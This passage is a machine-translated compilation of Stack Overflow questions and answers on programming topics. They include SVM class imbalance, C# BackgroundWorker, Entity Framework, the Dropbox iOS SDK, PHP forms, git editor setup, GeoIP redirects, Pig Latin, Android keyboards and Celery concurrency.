这是否意味着 SVM 没有考虑这些特征？还是这里的数据有问题？他们俩有关系吗？我只是无法让它超过 73.4229 号码。此外，支持向量的数量应该远小于数据集的大小，但在这种情况下，似乎并非如此。

一般来说，当交叉验证准确率与数据集中标签的比率相同时，这意味着什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-03T11:15:00.020

您的数据集是不平衡的，这意味着很大一部分属于同一类。这导致了所谓的默认或多数类分类器，通过简单地将所有内容分类为多数类的一部分来实现高精度。所以你是对的，它没有考虑到这些特征，因为数据。

libsvm README 建议改变惩罚权重来处理这个问题。这是一个相关的问题：[https ://stats.stackexchange.com/questions/20948/best-way-to-handle-unbalanced-multiclass-dataset-with-svm](https://stats.stackexchange.com/questions/20948/best-way-to-handle-unbalanced-multiclass-dataset-with-svm)

有关不平衡数据的更多信息，请参阅[支持向量机用户指南的](http://pyml.sourceforge.net/doc/howto.pdf)第 7 节。

# c# - 同步调用BackgroundWorker

> ID：12213650
> 
> 赞同：6
> 
> 时间：2012-08-31T10:36:53.227
> 
> 标签：c#, backgroundworker

我想同步调用后台工作人员。我希望在后台工作人员完成执行后结束代码的执行。我的 BackgroundWorker 代码在这里：

```
{
    BackgroundWorker worker = new BackgroundWorker();
    worker.DoWork += DoWork;
    worker.RunWorkerCompleted += RunWorkerCompleted;
    ...
    worker.RunWorkerAsync();
    //wait for execution to end 
} 
```

一种方法是再次检查状态 n 直到其执行完成，但是还有其他好的方法吗？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-31T10:38:59.713

如果你不希望你的代码异步执行，不要把它放在`BackgroundWorker`...

```
{ 
    DoWork();
} 
```

但是，如果有一些不明确的原因绝对需要在 中包含代码，则`BackgroundWorker`可以使用以下内容：

```
ManualResetEvent mre = new ManualResetEvent(false);
BackgroundWorker worker = new BackgroundWorker(); 
worker.DoWork += DoWork; 
worker.RunWorkerCompleted += (s, e) => 
                             {
                                 RunWorkerCompleted(s, e); 
                                 mre.Set();
                             };
// ... 
worker.RunWorkerAsync();
mre.WaitOne(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-08-31T12:40:27.430

**目标：** BackgroundWorker 应该同步执行。

创建了一个windows应用程序表单。单击 button1 时，它应该同步执行 BackgroundWorker 并返回参与 UI，因此用户在完成 BackgroundWorker 任务之前无法执行任何操作。

```
public partial class Form1 : Form 
{ 

    public Form1() 
    { 
        InitializeComponent(); 
    }

    BGimplent obj = null;

    private void button1_Click(object sender, EventArgs e)
    {
        int i = 0;
         obj = new BGimplent();
        obj.eveBG += obj_eveBG;
        i = 5;
        obj.MyProperty = 5;
        obj.DoConfig();
        obj.ManualReset.WaitOne();

        obj.MyProperty = 10;
        obj.MyProperty = 11;
        obj.MyProperty = 12;
        obj.MyProperty = 13;

        obj.MyProperty = 14;
    }

    void obj_eveBG(string s)
    {
        obj.ManualReset.Set();
        MessageBox.Show(s);
    }
}

/*
*******************************************************
    Paste below code in adding new class i.e. Class1

*/
public delegate void delBG(string s);

class BGimplent
{
    public event  delBG eveBG;

    private ManualResetEvent mnuReset = new ManualResetEvent(false);
    public ManualResetEvent ManualReset { get; set; }

    public int MyProperty { get; set; }

    BackgroundWorker bgWorker = new BackgroundWorker();
    public void DoConfig()
    {
        ManualReset = mnuReset;

        bgWorker.DoWork += bgWorker_DoWork;
        bgWorker.ProgressChanged += bgWorker_ProgressChanged;
        bgWorker.RunWorkerCompleted += bgWorker_RunWorkerCompleted;
        bgWorker.RunWorkerAsync();            
    }

    void bgWorker_DoWork(object sender, DoWorkEventArgs e)
    {   
        Thread.Sleep(5000);
        if (eveBG != null)
            eveBG("Value of MyProperty: " + MyProperty.ToString());
    }

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-01-21T13:25:34.517

您的代码`//wait for execution to end`应该放在`worker_RunWorkerCompleted`方法中。

# entity-framework - 首先在 ef 代码中查询三个（或更多）多对多相关实体

> ID：12213652
> 
> 赞同：1
> 
> 时间：2012-08-31T10:37:14.037
> 
> 标签：entity-framework, ef-code-first

我在 .net4.0 中使用 EF5.0，并且我有三个具有多对多关系的实体，如下所示：

```
 public class A
    {
        public int Id { get; set; }
        public ICollection<B> Bs { get; set; }
    }
    public class B
    {
        public int Id { get; set; }
        public ICollection<A> As { get; set; }
        public ICollection<C> Cs { get; set; }
    }
    public class C
    {
        public int Id { get; set; }
        public ICollection<B> Bs { get; set; }
    } 
```

这是我的映射代码：

```
 HasMany(a => a.Bs).WithMany(b => b.As).Map(m =>
        {
            m.ToTable("A_B");
        });

        HasMany(c => c.Bs).WithMany(b => b.Cs).Map(m =>
        {
            m.ToTable("B_C");
        }); 
```

对于A的某个实例，我怎样才能得到与B间接相关的所有C？

我想获得一个干净的 sql 查询，例如：

```
select C.* from C 
join B_C on B_C.Cid = C.id
join A_B on A_B.Bid = B_C.Bid
join A on A.id = A_B.Aid
where A.id = 1 
```

Coude 我没有给联结表一个实体类型就得到了那个 sql？我下面的代码有一个非常丑陋的带有嵌套查询的 sql：

```
var res = Context.C.Where(
                 c => c.Bs.SelectMany(b => b.As.Select(a => a.Id))
                          .Contains(theA.Id)
                     ); 
```

请帮我解决这个问题，非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:52:24.483

我会尝试这个查询：

```
var res = Context.C.Where(c => c.Bs.Any(b => b.As.Any(a => a.Id == theA.Id))); 
```

# ios - Dropbox SDK - linkFromController：委托还是回调？

> ID：12213653
> 
> 赞同：10
> 
> 时间：2012-08-31T10:37:32.210
> 
> 标签：ios, delegates, dropbox

我正在使用他们网站上提供的 SDK 将 Dropbox 添加到我的应用程序中。`[[DBSession sharedSession] linkFromController:self];`与帐户链接后，有什么方法可以调用某些方法吗？

基本上我想`[self.tableView reloadData]`在应用程序尝试登录 Dropbox 后打电话。它甚至不需要区分登录是否成功。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-01T11:39:58.550

Dropbox SDK 使用您的 AppDelegate 作为回调接收器。因此，当您调用`[[DBSession sharedSession] linkFromController:self];`Dropbox SDK 时，无论如何都会调用您的 AppDelegate 的`– application:openURL:sourceApplication:annotation:`方法。

因此，在 AppDelegate 中，您可以检查`[[DBSession sharedSession] isLinked]`登录是否成功。不幸的是，您的 viewController 没有回调，因此您必须通过其他方式通知它（直接引用或发布通知）。

```
- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation {
    if ([[DBSession sharedSession] handleOpenURL:url]) {
        if ([[DBSession sharedSession] isLinked]) {
            // At this point you can start making API Calls. Login was successful
            [self doSomething];
        } else {
            // Login was canceled/failed.
        }
        return YES;
    }
    // Add whatever other url handling code your app requires here
    return NO;
} 
```

由于 Apple 的政策存在问题，Dropbox 引入了这种相当奇怪的回调应用程序的方式。在旧版本的 SDK 中，会打开一个外部 Safari 页面来进行登录。Apple 在某个时间点不会接受此类应用程序。所以 Dropbox 的人引入了内部视图控制器登录，但保留 AppDelegate 作为结果的接收者。如果用户在他的设备上安装了 Dropbox 应用程序，登录将被定向到 Dropbox 应用程序，并且 AppDelegate 将在返回时被调用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-03-17T09:27:55.683

在 App 委托中添加：

```
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url { 
    if ([[DBSession sharedSession] handleOpenURL:url]) {

        [[NSNotificationCenter defaultCenter]
         postNotificationName:@"isDropboxLinked"
         object:[NSNumber numberWithBool:[[DBSession sharedSession] isLinked]]];

        return YES;
    }

    return NO;
} 
```

在你的自定义类中：

```
- (void)viewDidLoad {
    [super viewDidLoad];

    //Add observer to see the changes
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(isDropboxLinkedHandle:) name:@"isDropboxLinked" object:nil];

} 
```

和

```
 - (void)isDropboxLinkedHandle:(id)sender
{
    if ([[sender object] intValue]) {
       //is linked.
    }
    else {
       //is not linked
    }
} 
```

# php - 连接到数据库不同字段的两个选择表单

> ID：12213655
> 
> 赞同：0
> 
> 时间：2012-08-31T10:37:45.987
> 
> 标签：php, html

我需要相同形式的 2 个类似的选择选项，但两者都 r 链接了数据库上的 2 个不同字段，任何人都可以更正我的代码。我不需要2个提交按钮，我只是为了更好的可用性而放在那里我的代码是

```
echo "
      <form method=\"post\" action=\"".$_SERVER['PHP_SELF']."\">
      <p><strong>Event Time (hh:mm):</strong><br/>
      <select name=\"event_time_hh\">";
      for ($y=1; $y<=24; $y++){
       echo "<option value=\"$y\">$y</option>;

     <p><strong>Event end (hh:mm):</strong><br/>
     <select name=\"event_end_hh\">";
     for ($y=1; $y<=24; $y++){
       echo "<option value=\"$y\">$y</option>";
}
echo "</select> :
      <select name=\"event_end_mm\">
      <option value=\"00\">00</option>
      <option value=\"15\">15</option>
      <option value=\"30\">30</option>
      <option value=\"45\">45</option>
      <input type=\"submit\" name=\"submit\" value=\"Add Event!\">";
echo "</select> :
      <select name=\"event_time_mm\">
      <option value=\"00\">00</option>
      <option value=\"15\">15</option>
      <option value=\"30\">30</option>
      <option value=\"45\">45</option>
      <input type=\"submit\" name=\"submit\" value=\"Add Event!\">
</form>"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:23:59.493

您的初始代码似乎缺少可能导致语法错误的关闭“选择”标记。

相反，您可以尝试一种更简洁的方法，仅在必要时使用 PHP（保存转义所有引号）。

```
<form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
<p><strong>Event Time (hh:mm):</strong></p></br />
<select name="event_time_hh">
    <?php
        for ($y=1; $y<=24; $y++) {
            echo "<option value=\"$y\">$y</option>";    
        }
    ?>
</select>

<p><strong>Event end (hh:mm):</strong></p></br />
<select name="event_time_hh">
    <?php
        for ($x=1; $x<=24; $x++) {
            echo "<option value=\"$x\">$x</option>";    
        }
    ?>
</select>

<select name="event_time_mm">
    <option value="00">00</option>
    <option value="15">15</option>
    <option value="30">30</option>
    <option value="45">45</option>
</select>

<select name="event_end_mm">
    <option value="00">00</option>
    <option value="15">15</option>
    <option value="30">30</option>
    <option value="45">45</option>
</select>

<input type="submit" name="submit" value="Add Event" />
</form> 
```

此外，您可以检查表单是否已提交 - 然后验证并处理输入。

```
<?php

// Check to see if form has been submitted.
if (isset($_POST['submit'])) {

    /*  Some validation should be performed here to ensure the following
     *  values have actually been selected prior to form being submitted.
     */  
    $event_time_hh = $_POST['event_time_hh'];
    $event_time_mm = $_POST['event_time_mm'];
    $event_end_hh = $_POST['event_end_hh'];
    $event_end_mm = $_POST['event_end_mm'];

}
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:13:32.083

index.php echo ' '; for($y=1;$y<=24;$y++) echo "$y";

```
echo '</select>';

echo '
<select name="box2"> ';
for($y=1;$y<=24;$y++)
echo "<option value='$y'>$y</option>";
echo '
</select>

<input type="submit" value="submit">
</form> '; 
```

output.php

```
$box1_value = $_POST['box1'];
$box2_value = $_POST['box2']; 
```

Now, box1 and box2 has the selected values of 2 respective drop down boxes. Hope it meets your requirement

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:46:05.363

这个问题在我看来有点模棱两可。但据我了解，你可以做这样的事情

```
<form action="output.php method="post">
<select name="box1">
// here you populate from db field1
</select>

<select name="box2">
// here you populate from db field2
</select>

<input type="submit" value="submit>

</form> 
```

在 output.php 中

```
<?php
$box1 = $_POST['box1'];
$box2 = $_POST['box2'];
?> 
```

# git - 在我的文本编辑器中带有消息的 Git 提交不起作用

> ID：12213656
> 
> 赞同：1
> 
> 时间：2012-08-31T10:37:51.990
> 
> 标签：git, osx-lion, textmate

> **可能重复：**
> [如何让 git 使用 Textmate 作为我的默认编辑器？](https://stackoverflow.com/questions/12210998/how-do-i-get-git-to-use-textmate-as-my-default-editor)

当我输入`git commit`...它会启动 TextMate 并且我看到文件中的所有更改都被注释掉了。

但随后在命令行中，我看到了这一点（基本上是在 TextMate 启动时立即看到的）：

```
Aborting commit due to empty commit message. 
```

如果我在 TextMate 窗口中键入内容并关闭它，则不会发生提交。我仍然看到一切都没有上演。

**编辑1：**当我这样做`git commit -am <some message>`时，效果很好。

**编辑2：**

我的`.bash_profile`样子是这样的：

```
alias mate='open -a TextMate.app'
export EDITOR="/usr/bin/mate -w" 
```

帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:31:11.817

根据您[之前的问题](https://stackoverflow.com/questions/12210998/how-do-i-get-git-to-use-textmate-as-my-default-editor)，我正在做一些猜测。

你的 .gitconfig 中有这个：

```
[core]
    editor = mate 
```

这在你的 .bash_profile 中：

```
alias mate='open -a TextMate.app'
export EDITOR="/usr/bin/mate -w" 
```

这意味着您的 .gitconfig 将覆盖 EDITOR 环境变量。您要么想要 a) 修复 core.editor 指令，要么 b) 删除它，因为您的 EDITOR env 变量就足够了。

因此，我建议`editor = mate`从您的 .gitconfig 中完全删除行，因为它应该与您的 EDITOR env 变量一起使用。

# c# - 在操作链接单击时更改文化而不用资源文件刷新页面

> ID：12213657
> 
> 赞同：1
> 
> 时间：2012-08-31T10:37:55.140
> 
> 标签：c#, asp.net-mvc

我在 .NET Framework 4 中使用 EF 5 在 asp.net mvc 4 中工作（感谢 Azure 还不是 4.5）。我试图让用户通过按下按钮来更改当前的语言设置。需要更改的内容保存在资源文件中。

首先，我在 web.config 中获取浏览器设置

```
<globalization culture="auto" uiCulture="auto"/> 
```

然后我尝试通过超链接更改它。这是我正在使用的链接的示例：

```
<li>@Html.ActionLink("FR", "ChangeLanguage", "Account", new { language = "fr" }, null)</li>
<li>@Html.ActionLink("EN", "ChangeLanguage", "Account", new { language = "en" }, null)</li>
<li>@Html.ActionLink("NL", "ChangeLanguage", "Account", new { language = "nl" }, null)</li> 
```

这是我填充文本的方式：

```
@Html.Encode(MyProject.Web.Resources.General.Header_UserBadge_SettingsDeleteCurrentPicture) 
```

这是它们链接到的控制器操作：

```
public ActionResult ChangeLanguage(string language)
        {
            Thread.CurrentThread.CurrentCulture = CultureInfo.GetCultureInfo(language);
            Thread.CurrentThread.CurrentUICulture = CultureInfo.GetCultureInfo(language);
        } 
```

资源文件命名为：

1.  General.fr.resx => 法语
2.  General.resx => 英语
3.  General.nl.resx => 荷兰语

现在显然这不起作用。我似乎找不到任何我正在尝试做的事情的例子。我能找到的所有示例都刷新了页面。

所以我有两个问题：

1.  这可以做到吗？如果是，我怎么做错了？
2.  如果无法做到这一点，那么什么是好的解决方案？目前在操作结束时重定向似乎不会更改语言设置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:36:30.677

You have to store the changed language settings by the user in cookie or session and in the `Application_AcquireRequestState` of `Global.asax.cs` set the `CurrentUICulture` and `CurrentCulture` for the `Thread.CurrentThread` from the language stored in cookie/session.

You can also store the user's preferred language in database and by this way the user don't need to set the language every time logs-in.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:25:09.937

一种可能的方法是将您的链接放在 a 中`Partial View`，并在您更改文化后让您的 Action 返回部分视图。

```
 public ActionResult ChangeLanguage(string language)
    {
        Thread.CurrentThread.CurrentCulture = CultureInfo.GetCultureInfo(language);
        Thread.CurrentThread.CurrentUICulture = CultureInfo.GetCultureInfo(language);

         return PartialView("YourPartialView");
    } 
```

可以从 jquery/ajax 调用中调用此操作，因此您会看到不会发生回发

# php - 如何将不同的访问者重定向到不同的子域

> ID：12213658
> 
> 赞同：-1
> 
> 时间：2012-08-31T10:37:55.267
> 
> 标签：php, web-applications

如何将来自不同国家的不同访问者重定向到不同的子域。像美国人一样 - us.yourdomain.com，印度 - India.yourdomain.com

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T11:11:56.857

从这里下载 MaxMind 的 GeoIP.dat 数据库：

```
http://geolite.maxmind.com/download/geoip/database/GeoLiteCountry/GeoIP.dat.gz Free Version (GeoLiteCountry) 
```

然后从这里下载 geoip.inc：

```
http://geolite.maxmind.com/download/geoip/api/php/php-1.11.tar.gz 
```

提取并找到 geoip.inc 文件。

然后将这两个文件上传到页面所在的同一目录。编辑 php 页面并在其中使用此脚本：

```
<?php require_once('geoip.inc');
 $gi = geoip_open('GeoIP.dat', GEOIP_MEMORY_CACHE);
 $country = geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);
 $my_countries = array('us', 'ca', 'gb', 'fr', 'de', 'nl');
 if (!in_array(strtolower($country), $my_countries)){
 header('Location: http://www."ALL"TRAFFICURLGOESHERE.whatever');
 }
 else{
 header('Location: http://www."SELECTEDCOUNTRIES"URLGOESHERE.whatever');
 }
 ?> 
```

只需更改您要在该行中定位的国家/地区代码：

```
$my_countries = array('us', 'ca', 'gb', 'fr', 'de', 'nl'); 
```

以及提到的目标流量和剩余流量的 URL。

国家代码可在此处找到：MaxMind - ISO 3166 国家代码

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:43:12.093

您最好的选择是创建一个根页面，其中包含您想要的所有国家和/或语言，并创建一个 cookie 来记住他们选择的内容。这样，他们只会看到该页面一次，前提是他们不清除 cookie。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-13T19:45:21.527

我想补充一下 Nirmal 的回答，即某些服务器无法使用“Header('location:url')”

我不知道为什么，但这发生在我的现场

因此，我使用了 echo 而不是“header（location ....）”，然后使用了元刷新方法，顺便说一下，这被 seo 认为是更好的重定向。所以完整的代码是：

```
<?php
$website_root_path=’/path/to/root/’;require($website_root_path . ‘geoip.inc’);
$ip=$_SERVER[‘REMOTE_ADDR’];$gi=geoip_open($website_root_path . ‘GeoIP.dat’, GEOIP_STANDARD);
$country = geoip_country_code_by_addr($gi, $ip);
if ($country == ‘US’) {
}
else { 
    echo ‘&lt;META HTTP-EQUIV=”Refresh” Content=”0; URL=http://non-us.hiboomedia.com”&gt;’;
    exit; 
}
?> 
```

就我而言，我只是想将非美国的任何人重定向到非美国网站。使其适应您的需求；）

# java - 猪拉丁文中的展平运算符模式

> ID：12213659
> 
> 赞同：3
> 
> 时间：2012-08-31T10:38:01.067
> 
> 标签：java, apache-pig

我最近在工作中遇到了这个问题，它是关于猪扁平化的。我用一个简单的例子来表达

两个文件
===file1===
1_a
2_b
4_d

===file2（制表符分隔）===
1 a
2 b
3 c

猪脚本1：

```
a = load 'file1' as (str:chararray);
b = load 'file2' as (num:int, ch:chararray);
a1 = foreach a generate flatten(STRSPLIT(str,'_',2)) as (num:int, ch:chararray);
c = join a1 by num, b by num;
dump c;   -- exception java.lang.String cannot be cast to java.lang.Integer 
```

猪脚本2：

```
a = load 'file1' as (str:chararray);
b = load 'file2' as (num:int, ch:chararray);
a1 = foreach a generate flatten(STRSPLIT(str,'_',2)) as (num:int, ch:chararray);
a2 = foreach a1 generate (int)num as num, ch as ch;
c = join a2 by num, b by num;
dump c;   -- exception java.lang.String cannot be cast to java.lang.Integer 
```

猪脚本3：

```
a = load 'file1' as (str:chararray);
b = load 'file2' as (num:int, ch:chararray);
a1 = foreach a generate flatten(STRSPLIT(str,'_',2));
a2 = foreach a1 generate (int)$0 as num, $1 as ch;
c = join a2 by num, b by num;
dump c;   -- right 
```

我不知道为什么脚本 1,2 是错误的而脚本 3 是正确的，我也想知道是否有更简洁的表达式来获得关系 c，谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-03T06:11:32.590

您没有使用 PigStorage 有什么特别的原因吗？因为它可以让你的生活变得更轻松:)。

```
a = load '/file1' USING PigStorage('_') AS (num:int, char:chararray);
b = load '/file2' USING PigStorage('\t') AS (num:int, char:chararray);
c = join a by num, b by num;
dump c; 
```

另请注意，在 file1 中，您使用下划线作为分隔符，但您将“-”作为参数提供给 STRSPLIT。

**编辑：** 我在您提供的脚本上花了更多时间；脚本 1 和 2 确实不起作用，脚本 3 也可以这样工作（没有额外的 foreach）：

```
a = load 'file1' as (str:chararry);
b = load 'file2' as (num:int, ch:chararry);
a1 = foreach a generate flatten(STRSPLIT(str,'_',2));
c = join a1 by (int)($0), b by num;
dump c; 
```

至于问题的根源，我会大胆猜测并说它可能与此相关（[如 Pig 文档中所述](http://pig.apache.org/docs/r0.9.1/basic.html#Schemas)）以及 pig 的运行周期优化：

> 如果你 FLATTEN 一个内部模式为空的包，则结果关系的模式为空。

在您的情况下，我相信 STRSPLIT 结果的模式在运行之前是未知的。

**edit2：** 好的，这是我的理论解释：

[这是脚本 2 的完整 -explain- 输出](http://codetidy.com/3391/)，[这是针对脚本 3 的](http://codetidy.com/3392/)。我将在这里粘贴有趣的部分。

```
|---a2: (Name: LOForEach Schema: num#288:int,ch#289:chararray)
|   |   |
|   |   (Name: LOGenerate[false,false] Schema: num#288:int,ch#289:chararray)ColumnPrune:InputUids=[288, 289]ColumnPrune:OutputUids=[288, 289]
|   |   |   |
|   |   |   (Name: Cast Type: int Uid: 288)
|   |   |   |
|   |   |   |---num:(Name: Project Type: int Uid: 288 Input: 0 Column: (*)) 
```

以上部分适用于脚本 2；见最后一行。它假设输出`flatten(STRSPLIT)`将具有类型的第一个元素`integer`（因为您以这种方式提供了架构）。但实际上`STRSPLIT`有一个`null`输出模式，它被视为`bytearray`字段；所以输出`flatten(STRSPLIT)`实际上是`(n:bytearray, c:bytearray)`。因为您提供了一个模式，所以 pig 尝试将 java 强制转换（到 的输出`a1`）到`num`字段；它失败了，因为`num`实际上是一个`String`表示为 bytearray 的 java。由于这个 java-cast 失败，pig 甚至不会尝试在上面的行中进行显式转换。

让我们看看脚本 3 的情况：

```
|---a2: (Name: LOForEach Schema: num#85:int,ch#87:bytearray)
|   |   |
|   |   (Name: LOGenerate[false,false] Schema: num#85:int,ch#87:bytearray)ColumnPrune:InputUids=[]ColumnPrune:OutputUids=[85, 87]
|   |   |   |
|   |   |   (Name: Cast Type: int Uid: 85)
|   |   |   |
|   |   |   |---(Name: Project Type: bytearray Uid: 85 Input: 0 Column: (*)) 
```

看最后一行，这里的输出`a1`被正确处理为`bytearray`，这里没有问题。现在看看倒数第二行；pig 尝试（并成功）从 to 进行显式`bytearray`转换操作`integer`。

# android - 我的应用程序的永久键盘可见性

> ID：12213660
> 
> 赞同：2
> 
> 时间：2012-08-31T10:38:21.570
> 
> 标签：android, static, keyboard, visibility

我正在尝试为平板电脑制作一个 android 应用程序。默认情况下，我需要在所有活动上方显示键盘，并且当用户按下返回键时我不需要隐藏键盘。任何想法让它工作？？？

**编辑：**通过使用自定义 EditText 解决

```
 public class CustomEdit extends EditText {

public CustomEdit(Context context, AttributeSet attrs) {
    super(context, attrs);
    // TODO Auto-generated constructor stub
}
@Override
public boolean onKeyPreIme(int keyCode, KeyEvent event) {
    // TODO Auto-generated method stub
    Log.e("Log", "onKeyPreIme");
    return true;
    //return super.onKeyPreIme(keyCode, event);
} 
```

}

[Android：如何使键盘始终可见？](https://stackoverflow.com/a/12243804/1004605)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:41:03.327

```
InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
            imm.toggleSoftInput(InputMethodManager.SHOW_FORCED,0); 
```

并且还添加这个来捕捉被按下的 backButton 并且什么都不做。

```
@Override
    public void onBackPressed() {
        // do nothing
        return;

    } 
```

还，

```
mEditText.setOnKeyListener(new View.OnKeyListener() {
            public boolean onKey(View v, int keyCode, KeyEvent event) {

            if (keyCode == KeyEvent.KEYCODE_BACK) 
                     // again do nothing

              return false;
                  } }; 
```

***注意：***最初只有添加*`android:windowSoftInputMode="stateAlwaysVisible"`*才会显示键盘，但如果您不覆盖 backButton，则可以通过按 BackButton 将其关闭。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:41:45.527

您可以在清单中使用它， android:windowSoftInputMode="stateAlwaysVisible" 用于所有活动。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T10:49:55.437

我已经在我的一个应用程序中实现了这一点。你需要以下代码。

```
// getting InputMethodManager system service which will handle aur
        // keyboard event
        InputMethodManager imm = (InputMethodManager) getSystemService(INPUT_METHOD_SERVICE);

        // restartInput method will restart the current view with its updated 
        // content. here medtName is a EditText
        imm.restartInput(medtName);

        // toggleSoftInput will responsible for showing or hiding device
        // keyboard.
        imm.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0); 
```

# iphone - 在视图 IOS 中禁用用户交互

> ID：12213663
> 
> 赞同：29
> 
> 时间：2012-08-31T10:38:29.163
> 
> 标签：iphone, objective-c, ios, xcode, cocoa-touch

我正在使用以下代码禁用和启用视图....

```
[self.view setUserInteractionEnabled:NO];
[self.view setUserInteractionEnabled:YES]; 
```

如果我这样做，它的所有子视图也会受到影响......所有都被禁用，我该如何只针对特定视图？是否可以？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-08-31T10:45:10.980

完全相同，假设您的其他视图是成员或者您可以遍历`self.view`的子视图数组，如下所示：

**MyViewController.h**

```
UIView* otherView; 
```

**我的视图控制器.m**

```
otherView.userInteractionEnabled = NO; // or YES, as you desire. 
```

或者：

```
for (int i = 0; i < [[self.view subviews] count]; i++)
{
    UIView* view = [[self.view subviews] objectAtIndex: i];

    // now either check the tag property of view or however else you know
    // it's the one you want, and then change the userInteractionEnabled property.
} 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2015-12-03T12:12:06.950

迅速`UIView`确实具有`userInteractionEnabled`使其响应或不响应的属性。要使完整的视图无响应使用代码：

```
// make screen unresponsive
self.view.userInteractionEnabled = false
//make navigation bar unresponsive
self.navigationController!.view.userInteractionEnabled = false

// make screen responsive
self.view.userInteractionEnabled = true
//make navigation bar responsive
self.navigationController!.view.userInteractionEnabled = true 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-08-31T10:44:40.770

```
for (UIView* view in self.view.subviews) {

    if ([view isKindOfClass:[/*"which ever class u want eg UITextField "*/ class]])

        [view setUserInteractionEnabled:NO];

} 
```

希望能帮助到你。快乐编码:)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T12:11:28.297

最好的选择是使用`Tag`视图的属性而不是迭代它的所有子视图。只需将标签设置为您要禁用交互的子视图，然后使用下面的代码访问它并禁用交互。

```
// considering 5000 is tag value set for subView 
// for which we want to disable user interaction  
UIView *subView = [self.view viewWithTag:5000]; 
[subView setUserInteractionEnabled:NO]; 
```

# python - 芹菜。减少进程数

> ID：12213665
> 
> 赞同：19
> 
> 时间：2012-08-31T10:38:32.540
> 
> 标签：python, django, celery

有什么办法可以限制[芹菜](http://celery.readthedocs.org/en/latest/index.html)的工人数量吗？我有小型服务器，芹菜总是在 1 个核心处理器上创建 10 个进程。我想将此数字限制为 3 个进程。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-08-31T14:56:03.743

我尝试在我的 settings.py 文件中将并发设置为 1，将 max_tasks_per_child 设置为 1，并同时运行 3 个任务。它只是将 1 个进程作为用户生成，另外 2 个进程作为 celery。它应该只运行 1 个进程，然后等待它完成，然后再运行另一个进程。

我正在使用 django 芹菜。

**编辑**{

我通过在 settings.py 文件中写入 CELERYD_CONCURRENCY = 1 来分配并发性。但是当我使用“tail -f /var/log/celery/w1.log”查看 celery 日志文件时，我看到分配给并发的值为 8。这告诉我 setting.py 不会改变并发性。为了解决这个问题，我在“/etc/default/celeryd”文件中添加了以下几行。

```
# Extra arguments to celeryd
CELERYD_OPTS="--concurrency=1" 
```

现在队列中的第二个任务等待第一个任务完成。

}

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-08-31T11:25:42.210

celery worker **--concurrency**选项允许指定处理队列的子进程数。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-02T20:54:27.663

我的 celeryd-config 文件中有这个

```
CELERYD_NODES=2 
```

这导致

```
$ ps -ef | grep "celery" | grep -v "grep"
www-data  1783     1  0 17:50 ?        00:00:46 /usr/bin/python /opt/webapps/repo/manage.py celeryd --loglevel=INFO -n celery1.xxx-31-39-06-74-75 --logfile=/var/log/celery/1.log --pidfile=/var/run/celery/1.pid 
www-data  1791  1783  0 17:50 ?        00:00:01 /usr/bin/python /opt/webapps/repo/manage.py celeryd --loglevel=INFO -n celery1.xxx-31-39-06-74-75 --logfile=/var/log/celery/1.log --pidfile=/var/run/celery/1.pid
www-data  1802     1  0 17:50 ?        00:00:52 /usr/bin/python /opt/webapps/repo/manage.py celeryd --loglevel=INFO -n celery2.xxx-31-39-06-74-75 --logfile=/var/log/celery/2.log --pidfile=/var/run/celery/2.pid 
www-data  1858  1802  0 17:50 ?        00:00:01 /usr/bin/python /opt/webapps/repo/manage.py celeryd --loglevel=INFO -n celery2.xxx-31-39-06-74-75 --logfile=/var/log/celery/2.log --pidfile=/var/run/celery/2.pid 
```

有四个进程，不是两个，而是两个工人。看起来每个工作线程都有两个进程。因此，大概如果您将 CELERYD_NODES 设置为 3，您将获得 3 个工人但 6 个进程。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-09-21T09:43:09.643

您应该在 celery 选项参数中尝试 --autoscale=3 。

# cocoa-touch - Xcode（Cocoa）如何将字节写入 NSData

> ID：12213667
> 
> 赞同：0
> 
> 时间：2012-08-31T10:38:35.890
> 
> 标签：cocoa-touch, byte, xcode4.3, nsdata

码...

我想向 NSData 写入一个字节 (1)。这似乎很简单，但我无法找到正确的链接如何做到这一点。我尝试使用无符号字符来做到这一点。但这存储了十六进制值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T10:41:59.560

您不能添加字节以`NSData`使用`NSMutableData`appendBytes:bytes length: 方法

# javascript - 如何在 JSP 中为单选按钮选择单元格或行？

> ID：12213676
> 
> 赞同：2
> 
> 时间：2012-08-31T10:39:03.953
> 
> 标签：javascript

